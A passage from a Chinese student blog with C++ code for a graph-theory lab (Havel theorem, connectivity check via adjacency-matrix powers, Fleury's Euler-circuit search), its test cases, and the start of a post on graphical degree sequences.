class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solution::clearTemLink</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">			tem[i][j] = adjMatrix[i][j];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solution::checkConnected</span><span class="params">(Node* node, <span class="keyword">int</span> n)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;#==========检查图是否连通&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> t = <span class="number">1</span>; t &lt; n; t++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">clearTemLink</span>();</span><br><span class="line">		<span class="keyword">int</span> tt = t;</span><br><span class="line">		<span class="keyword">while</span> (tt<span class="number">-1</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">int</span> ans[maxn][maxn];</span><br><span class="line">			<span class="built_in">memset</span>(ans, <span class="number">0</span>, <span class="built_in"><span class="keyword">sizeof</span></span>(ans));</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">					<span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">1</span>; k &lt;= n; k++) &#123;</span><br><span class="line">						ans[i][j] += adjMatrix[i][k] * tem[k][j];</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++)</span><br><span class="line">				&#123;</span><br><span class="line">					tem[i][j] = ans[i][j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			tt--;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		cout &lt;&lt; <span class="string">&quot;A^&quot;</span> &lt;&lt; t &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; endl;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">				<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, tem[i][j]);</span><br><span class="line">			&#125;</span><br><span class="line">			cout &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">				sumLink[i][j] += tem[i][j];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;B^&quot;</span> &lt;&lt; n - <span class="number">1</span> &lt;&lt; <span class="string">&quot; = &quot;</span> &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n; j++) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;%5d&quot;</span>, sumLink[i][j]);</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n &amp;&amp; isConnected; i++) &#123;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">1</span>; j &lt;= n &amp;&amp; isConnected; j++) &#123;</span><br><span class="line">			<span class="keyword">if</span> (i != j) &#123;</span><br><span class="line">				<span class="keyword">if</span> (sumLink[i][j] == <span class="number">0</span>) &#123;</span><br><span class="line">					cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;不连通&quot;</span> &lt;&lt; endl;</span><br><span class="line">					isConnected = <span class="literal">false</span>;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (isConnected) &#123;</span><br><span class="line">		cout &lt;&lt; endl &lt;&lt; <span class="string">&quot;连通&quot;</span> &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solution::dfs</span><span class="params">(<span class="keyword">int</span> x)</span> </span>&#123;</span><br><span class="line">	stk[top++] = x;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123;</span><br><span class="line">		<span class="keyword">if</span> (adjMatrix[x][i]) &#123;</span><br><span class="line">			adjMatrix[x][i] = adjMatrix[i][x] = <span class="number">0</span>; <span class="comment">// 删除此边</span></span><br><span class="line">			<span class="built_in">dfs</span>(i);</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solution::fleury</span><span class="params">(<span class="keyword">int</span> startIndex)</span> </span>&#123;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;#==========搜索欧拉回路&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout &lt;&lt; &quot;start = &quot; &lt;&lt; startIndex &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> brige;</span><br><span class="line">	top = <span class="number">0</span>;</span><br><span class="line">	stk[top++] = startIndex; <span class="comment">// 将起点放入Euler路径中</span></span><br><span class="line">	<span class="keyword">while</span> (top &gt; <span class="number">0</span>) &#123;</span><br><span class="line">		brige = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; ++i) &#123; <span class="comment">// 试图搜索一条边不是割边（桥） </span></span><br><span class="line">			<span class="keyword">if</span> (adjMatrix[stk[top - <span class="number">1</span>]][i]) &#123;</span><br><span class="line">				brige = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">break</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span> (brige) &#123; <span class="comment">// 如果没有点可以扩展，输出并出栈</span></span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;v&quot;</span> &lt;&lt; stk[--top] &lt;&lt; <span class="string">&quot; -&gt; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> &#123; <span class="comment">// 否则继续搜索欧拉路径</span></span><br><span class="line">			<span class="built_in">dfs</span>(stk[--top]);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;done.&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;#==========读入序列长度&quot;</span> &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; endl;</span><br><span class="line">	<span class="keyword">int</span> n;</span><br><span class="line">	<span class="keyword">int</span> oddNum = <span class="number">0</span>;</span><br><span class="line">	</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;n = &quot;</span>;</span><br><span class="line">	cin &gt;&gt; n;</span><br><span class="line"></span><br><span class="line">	<span class="function">solution <span class="title">method</span><span class="params">(n)</span></span>;</span><br><span class="line"></span><br><span class="line">	method.<span class="built_in">initialList</span>();</span><br><span class="line"></span><br><span class="line">	method.<span class="built_in">checkGraphRealization</span>(method.node, n);</span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果可简单图化，根据 Havel 定理过程求出对应的简单图，并输出此图</span></span><br><span class="line">	<span class="keyword">if</span> (method.canSimpleGraphRealization) &#123;</span><br><span class="line">		method.<span class="built_in">Havel</span>(method.node, n);</span><br><span class="line"></span><br><span class="line">		<span class="comment">//如果可简单图化，根据 Havel 定理构造对应简单图</span></span><br><span class="line">		<span class="keyword">if</span> (method.canSimpleGraphRealization)method.<span class="built_in">buildSimpleGraph</span>(method.node, n);</span><br><span class="line">		</span><br><span class="line">		<span class="comment">//检查是否连通</span></span><br><span class="line">		method.<span class="built_in">checkConnected</span>(method.node, n);</span><br><span class="line">	</span><br><span class="line">		<span class="comment">//连通，求欧拉回路</span></span><br><span class="line">		<span class="keyword">int</span> startIndex = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">		<span class="comment">//method.display();</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (method.isConnected) &#123;</span><br><span class="line">			<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt;= n; i++)</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">if</span> (method.node[i].degree % <span class="number">2</span>) &#123;</span><br><span class="line">					oddNum++;</span><br><span class="line">					startIndex = i;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			cout &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; <span class="string">&quot;#==========检查是否有欧拉回路&quot;</span> &lt;&lt; endl;</span><br><span class="line">			cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> (oddNum == <span class="number">0</span>) &#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;有欧拉回路！&quot;</span> &lt;&lt; endl;</span><br><span class="line">				method.<span class="built_in">fleury</span>(startIndex);</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">else</span> &#123;</span><br><span class="line">				cout &lt;&lt; <span class="string">&quot;没有欧拉回路！&quot;</span> &lt;&lt; endl;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="测试数据"><a href="#测试数据" class="headerlink" title="测试数据"></a>测试数据</h3><p>从民间收集了5个具有代表性的测试数据</p>
<h4 id="case-1"><a href="#case-1" class="headerlink" title="case 1"></a>case 1</h4><ul>
<li><p>input<br><code>3, 3, 2, 2, 1</code></p>
</li>
<li><p>output</p>
</li>
</ul>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132142652.png" alt="image-20211213214226816" style="zoom:80%;" /></p>
<h4 id="case-2"><a href="#case-2" class="headerlink" title="case 2"></a>case 2</h4><ul>
<li>input<br><code>3, 3, 2</code></li>
<li>output</li>
</ul>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132148896.png" alt="image-20211213214336710" style="zoom:80%;" /></p>
<h4 id="case-3"><a href="#case-3" class="headerlink" title="case 3"></a>case 3</h4><ul>
<li>input<br><code>1, 1, 1, 1</code></li>
<li>output</li>
</ul>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132148766.png" alt="image-20211213214604678" style="zoom: 80%;" /></p>
<h4 id="case-4"><a href="#case-4" class="headerlink" title="case 4"></a>case 4</h4><ul>
<li>input<br><code>3, 2, 2, 1</code></li>
<li>output</li>
</ul>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132149966.png" alt="image-20211213214730768" style="zoom:80%;" /></p>
<h4 id="case-5"><a href="#case-5" class="headerlink" title="case 5"></a>case 5</h4><ul>
<li>input<br><code>3, 2, 2, 1</code></li>
<li>output</li>
</ul>
<p><img src="https://expicture.oss-cn-beijing.aliyuncs.com/img/202112132149362.png" alt="image-20211213214843142" style="zoom:80%;" /></p>
<h2 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h2><p>本次实验，通过动手编写程序，掌握了可简单图化的定义，连通图、欧拉图的判断方法，欧拉回路的搜索方法，熟悉了Havel定理以及Fleury算法，首次系统地将离散数学的理论知识应用到程序实践上，加深对图论知识的印象，锻炼了代码能力。</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2021/12/08/%E5%8F%AF%E7%AE%80%E5%8D%95%E5%9B%BE%E5%8C%96%E3%80%81%E8%BF%9E%E9%80%9A%E5%9B%BE%E3%80%81%E6%AC%A7%E6%8B%89%E5%9B%BE%E5%92%8C%E5%93%88%E5%AF%86%E9%A1%BF%E5%9B%BE%E7%9A%84%E5%88%A4%E6%96%AD/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.png">
      <meta itemprop="name" content="Existo">
      <meta itemprop="description" content="Hello Nerd">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Existo's Blog">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/12/08/%E5%8F%AF%E7%AE%80%E5%8D%95%E5%9B%BE%E5%8C%96%E3%80%81%E8%BF%9E%E9%80%9A%E5%9B%BE%E3%80%81%E6%AC%A7%E6%8B%89%E5%9B%BE%E5%92%8C%E5%93%88%E5%AF%86%E9%A1%BF%E5%9B%BE%E7%9A%84%E5%88%A4%E6%96%AD/" class="post-title-link" itemprop="url">可简单图化、连通图、欧拉图和哈密顿图的判断</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-12-08 22:34:03 / 修改时间：23:16:29" itemprop="dateCreated datePublished" datetime="2021-12-08T22:34:03+08:00">2021-12-08</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/%E5%AD%A6%E4%B9%A0/" itemprop="url" rel="index"><span itemprop="name">学习</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h2 id="可图化"><a href="#可图化" class="headerlink" title="可图化"></a>可图化</h2><p>设非负整数数列d=( d1,d2, …, dn ),若存在无向图G, 使得G的度数列是d, 则称d为可图化的.</p>
<h3 id="可简单图化"><a href="#可简单图化" class="headerlink" title="可简单图化"></a>可简单图化</h3><p>设非负整数列d=( d1,d2, …, dn ),若存在无向简单图G, 使得G的度数列是d,则称d为可简单图化的.</p>
<h3 id="可图化充要条件"><a href="#可图化充要条件" class="headerlink" title="可图化充要条件"></a>可图化充要条件</h3><p>非负整数列d=(d1,d2,…,dn)是可图化的, 当且仅当<strong><code>d1 + d2 + … + dn = 0(mod 2)</code></strong> <em>握手定理</em></p>
<h3 id="可简单图化充要条件（Havel定理）"><a href="#可简单图化充要条件（Havel定理）" class="headerlink" title="可简单图化充要条件（Havel定理）"></a>可简单图化充要条件（Havel定理）</h3><p>设非负整数列d=(d1,d2,…,dn)满足:</p>
<p>$\begin{cases}{d1+d2+…+dn=0(mod 2)}\\{n-1≥d1≥d2≥…≥dn≥0}\end{cases}$</p>
<p>则d可简单图化当且仅当<br>d’=(d2-1,d3-1,…,dd1+1-1, dd1+2,…,dn)可简单图化</p>
<p>该定理的两个条件：</p>
<ol>
<li><strong>可图化</strong>；</li>
<li><strong>最大度小于等于n-1</strong></li>
</ol>
<p>例: d=(4,<strong>4,3,3,2</strong>,2)可简单图化 &lt;=&gt; d’=(<strong>3,2,2,1</strong>,2)可简单图化</p>
<p>d’中注释数也就是<strong>第一个数个</strong>后续的数减一</p>
<h4 id="Havel定理等价形式"><a href="#Havel定理等价形式" class="headerlink" title="Havel定理等价形式"></a>Havel定理等价形式</h4><p>非负整数<br>d=(d1,d2,…,dn) 可简单图化当且仅当</p>
<p>$d1+d2+…+dn=0(mod 2)$</p>
<p>并且对r=1,2,…,n有</p>
<p>$d1+d2+…+dr ≤ r(r-1)+min(r,dr+1)+min(r,dr+2)+…+min(r,dn)$</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><span class="space">&hellip;</span><a class="page-number" href="/page/4/">4</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right" aria-label="下一页"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="Existo"
      src="/images/avatar.png">
  <p class="site-author-name" itemprop="name">Existo</p>
  <div class="site-description" itemprop="description">Hello Nerd</div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">31</span>
          <span class="site-state-item-name">日志</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">3</span>
        <span class="site-state-item-name">分类</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">11</span>
        <span class="site-state-item-name">标签</span></a>
      </div>
  </nav>
</div>
  <div class="links-of-author motion-element">
      <span class="links-of-author-item">
        <a href="https://github.com/ExistoT01" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;ExistoT01" rel="noopener" target="_blank"><i class="fab fa-github fa-fw"></i>GitHub</a>
      </span>
      <span class="links-of-author-item">
        <a href="mailto:1x6tot01@gmail.com" title="E-Mail → mailto:1x6tot01@gmail.com" rel="noopener" target="_blank"><i class="fa fa-envelope fa-fw"></i>E-Mail</a>
      </span>
  </div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2021-11 – 
  <span itemprop="copyrightYear">2022</span>
  <span class="with-love">
    <i class="fa fa-heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Existo</span>
</div>
  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
  </div>

        








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  
      

<script>
  if (typeof MathJax === 'undefined') {
    window.MathJax = {
      loader: {
        source: {
          '[tex]/amsCd': '[tex]/amscd',
          '[tex]/AMScd': '[tex]/amscd'
        }
      },
      tex: {
        inlineMath: {'[+]': [['$', '$']]},
        tags: 'ams'
      },
      options: {
        renderActions: {
          findScript: [10, doc => {
            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
              const display = !!node.type.match(/; *mode=display/);
              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
              const text = document.createTextNode('');
              node.parentNode.replaceChild(text, node);
              math.start = {node: text, delim: '', n: 0};
              math.end = {node: text, delim: '', n: 0};
              doc.math.push(math);
            });
          }, '', false],
          insertedScript: [200, () => {
            document.querySelectorAll('mjx-container').forEach(node => {
              let target = node.parentNode;
              if (target.nodeName.toLowerCase() === 'li') {
                target.parentNode.classList.add('has-jax');
              }
            });
          }, '', false]
        }
      }
    };
    (function () {
      var script = document.createElement('script');
      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
      script.defer = true;
      document.head.appendChild(script);
    })();
  } else {
    MathJax.startup.document.state(0);
    MathJax.texReset();
    MathJax.typeset();
  }
</script>

    

  


</body>
</html>
